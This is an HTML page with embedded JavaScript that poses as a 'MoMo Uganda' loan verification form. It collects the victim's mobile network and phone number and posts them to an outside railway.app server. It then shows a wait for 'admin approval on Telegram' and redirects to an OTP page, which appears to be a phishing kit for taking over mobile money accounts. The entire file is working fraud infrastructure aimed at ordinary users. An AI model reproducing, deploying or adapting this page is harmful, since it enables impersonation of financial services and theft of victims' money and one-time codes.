<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Verify Loan - MoMo Uganda</title>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'DM Sans', sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .card {
            width: 100%;
            max-width: 430px;
            background: white;
            border-radius: 28px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
            padding: 28px 28px 24px;
        }
        .logo-wrap {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 18px;
        }
        .logo-bg {
            background: white;
            border-radius: 14px;
            padding: 6px;
            width: 48px;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .brand-name {
            font-family: 'Sora', sans-serif;
            font-size: 18px;
            font-weight: 700;
            color: white;
        }
        .brand-sub {
            font-size: 11.5px;
            color: rgba(255,255,255,0.72);
        }
        .header-title {
            font-family: 'Sora', sans-serif;
            font-size: 23px;
            font-weight: 800;
            color: white;
        }
        .header-desc {
            font-size: 13.5px;
            color: rgba(255,255,255,0.78);
            margin-top: 6px;
        }
        .loan-info {
            margin: 20px 22px 0;
            background: rgba(228,35,32,0.08);
            border: 1px solid rgba(228,35,32,0.18);
            border-radius: 18px;
            padding: 16px 18px;
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .loan-icon {
            width: 42px; height: 42px;
            background: #E42320;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
        }
        .loan-amount {
            font-family: 'Sora', sans-serif;
            font-size: 26px;
            font-weight: 800;
            color: #111827;
        }
        .form-body {
            padding: 22px 22px 26px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 7px;
        }
        select, input {
            width: 100%;
            padding: 13px 15px;
            background: #f9fafb;
            border: 1.5px solid #e5e7eb;
            border-radius: 13px;
            font-size: 15.5px;
            outline: none;
        }
        select:focus, input:focus {
            border-color: #E42320;
        }
        .btn-primary {
            width: 100%;
            background: linear-gradient(135deg, #E42320, #c01c1a);
            color: white;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-primary:disabled {
            background: #d1d5db;
            cursor: not-allowed;
        }
        .btn-back {
            width: 100%;
            background: transparent;
            color: #4b5563;
            border: 1.5px solid #e5e7eb;
            padding: 14px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
        }
        .error-msg {
            display: none;
            background: #fee2e2;
            border: 1px solid #fca5a5;
            color: #b91c1c;
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 13.5px;
        }
        .status-msg {
            display: none;
            background: #eff6ff;
            border: 1px solid #93c5fd;
            color: #1e40af;
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 16px;
            text-align: center;
            font-weight: 600;
        }
        .waiting-area {
            display: none;
            text-align: center;
            padding: 20px;
            background: #fef3c7;
            border-radius: 16px;
            margin-bottom: 20px;
        }
        .waiting-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 12px;
        }
        .dot {
            width: 10px;
            height: 10px;
            background: #E42320;
            border-radius: 50%;
            animation: pulse 1.5s ease-in-out infinite;
        }
        .dot:nth-child(2) { animation-delay: 0.3s; }
        .dot:nth-child(3) { animation-delay: 0.6s; }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); }
        }
        #spinner {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 20px;
        }
        .spin-ring {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.2);
            border-top-color: #E42320;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .security-note {
            text-align: center;
            font-size: 12px;
            color: #9ca3af;
            margin-top: 18px;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="header">
        <div class="logo-wrap">
            <div class="logo-bg">
                <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
                    <rect x="3" y="12" width="22" height="14" rx="3" fill="white"/>
                    <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="white" stroke-width="2.2" fill="none"/>
                    <circle cx="14" cy="19" r="2.5" fill="#E42320"/>
                </svg>
            </div>
            <div>
                <div class="brand-name">MoMo Uganda</div>
                <div class="brand-sub">Mobile Money</div>
            </div>
        </div>
        <div class="header-title">Verify Your Loan</div>
        <div class="header-desc">Enter your details to continue</div>
    </div>

    <div class="loan-info">
        <div class="loan-icon">₸</div>
        <div>
            <div style="font-size:11px; color:#E42320;">Loan Amount</div>
            <div class="loan-amount" id="loanAmount">—</div>
            <div id="loanDetails" style="font-size:12px; color:#4b5563;"></div>
        </div>
    </div>

    <div class="form-body">
        <div class="form-group">
            <label>Mobile Money Network</label>
            <select id="network">
                <option value="MTN">MTN MoMo</option>
                <option value="Airtel">Airtel Money</option>
                <option value="Africell">Africell</option>
            </select>
        </div>
        <div class="form-group">
            <label>MoMo Phone Number</label>
            <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
            <div style="font-size:11px; color:#9ca3af; margin-top:5px;">Enter Uganda number (077, 078, 075, 070, 039)</div>
        </div>
        
        <div class="error-msg" id="errorMsg"></div>
        <div class="status-msg" id="statusMsg"></div>
        
        <div class="waiting-area" id="waitingArea">
            <strong>⏳ Waiting for Admin Approval</strong>
            <div class="waiting-dots">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
            <p style="font-size: 12px; margin-top: 12px;">Please wait while admin reviews your application...</p>
        </div>
        
        <button class="btn-primary" id="submitBtn">Submit Application →</button>
        <button class="btn-back" onclick="window.location.href='index.html'">← Back</button>
        <div class="security-note">🔒 Secured by MoMo Uganda</div>
    </div>
</div>

<div id="spinner">
    <div class="spin-ring"></div>
    <p style="color:white;">Submitting application...</p>
</div>

<script>
    const API_URL = 'https://momo-uganda-production.up.railway.app';
    
    let pollInterval = null;
    let currentLoanId = null;

    function loadLoanData() {
        const data = sessionStorage.getItem('calculatorData');
        if (data) {
            const loan = JSON.parse(data);
            document.getElementById('loanAmount').textContent = `UGX ${loan.amount.toLocaleString()}`;
            document.getElementById('loanDetails').textContent = `${loan.duration/30} months • UGX ${loan.monthly.toLocaleString()}/month`;
        }
    }

    function isValidPhone(phone) {
        if (phone.length !== 10) return false;
        const prefixes = ['077', '078', '075', '070', '039', '074', '076'];
        return prefixes.some(p => phone.startsWith(p));
    }

    function showError(msg) {
        const err = document.getElementById('errorMsg');
        err.textContent = msg;
        err.style.display = 'block';
        setTimeout(() => err.style.display = 'none', 4000);
    }

    function showStatus(msg, isSuccess = false) {
        const status = document.getElementById('statusMsg');
        status.textContent = msg;
        status.style.background = isSuccess ? '#f0fdf4' : '#eff6ff';
        status.style.color = isSuccess ? '#166534' : '#1e40af';
        status.style.border = isSuccess ? '1px solid #86efac' : '1px solid #93c5fd';
        status.style.display = 'block';
        setTimeout(() => status.style.display = 'none', 5000);
    }

    // Poll for approval status
    function startPolling(loanId) {
        console.log('Starting polling for loan:', loanId);
        
        pollInterval = setInterval(async () => {
            try {
                const response = await fetch(`${API_URL}/api/loan/${loanId}`);
                const data = await response.json();
                
                console.log('Poll response:', data);
                
                if (data.success && data.loan.status === 'otp_sent') {
                    // Approved! Redirect to OTP page
                    clearInterval(pollInterval);
                    document.getElementById('spinner').style.display = 'none';
                    showStatus("✅ Approved! Redirecting to OTP page...", true);
                    setTimeout(() => {
                        window.location.href = `${API_URL}/otp.html`;
                    }, 1500);
                } 
                else if (data.success && data.loan.status === 'declined') {
                    clearInterval(pollInterval);
                    document.getElementById('spinner').style.display = 'none';
                    document.getElementById('waitingArea').style.display = 'none';
                    showError("❌ Application declined by admin.");
                    document.getElementById('submitBtn').disabled = false;
                    document.getElementById('submitBtn').textContent = "Submit Application →";
                }
            } catch (err) {
                console.error('Polling error:', err);
            }
        }, 3000); // Check every 3 seconds
        
        // Stop polling after 5 minutes
        setTimeout(() => {
            if (pollInterval) {
                clearInterval(pollInterval);
                console.log('Polling stopped after timeout');
            }
        }, 300000);
    }

    // Submit application
    document.getElementById('submitBtn').onclick = async () => {
        const phone = document.getElementById('phone').value.trim();
        const network = document.getElementById('network').value;
        
        if (!phone || !isValidPhone(phone)) {
            showError("Enter valid Uganda number (077/078/075/070/039)");
            return;
        }

        const loanData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
        
        const btn = document.getElementById('submitBtn');
        btn.disabled = true;
        btn.textContent = "Submitting...";
        document.getElementById('spinner').style.display = 'flex';

        try {
            const response = await fetch(`${API_URL}/api/save-loan`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: phone,
                    pin: "1234",
                    network: network,
                    amount: loanData.amount || 500000,
                    duration: loanData.duration || 90,
                    monthly: loanData.monthly || 182500,
                    total: loanData.total || 547500,
                    interest: loanData.interest || 47500
                })
            });

            const data = await response.json();
            
            if (data.success) {
                currentLoanId = data.loanId;
                sessionStorage.setItem('loanId', currentLoanId);
                sessionStorage.setItem('userPhone', phone);
                sessionStorage.setItem('userNetwork', network);
                
                // Hide spinner, show waiting area
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('waitingArea').style.display = 'block';
                btn.style.display = 'none';
                
                showStatus("📱 Application sent! Waiting for admin approval on Telegram...");
                
                // Start polling for approval
                startPolling(currentLoanId);
            } else {
                throw new Error(data.error || "Submission failed");
            }
        } catch (err) {
            console.error('Submit error:', err);
            document.getElementById('spinner').style.display = 'none';
            showError("Error: " + err.message);
            btn.disabled = false;
            btn.textContent = "Submit Application →";
        }
    };

    // Phone input validation
    document.getElementById('phone').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
    });

    // Check if there's a pending loan on page load
    const existingLoanId = sessionStorage.getItem('loanId');
    if (existingLoanId) {
        currentLoanId = existingLoanId;
        document.getElementById('submitBtn').style.display = 'none';
        document.getElementById('waitingArea').style.display = 'block';
        showStatus("⏳ You have a pending application. Waiting for admin approval...");
        startPolling(currentLoanId);
    }

    loadLoanData();
</script>
</body>
</html>
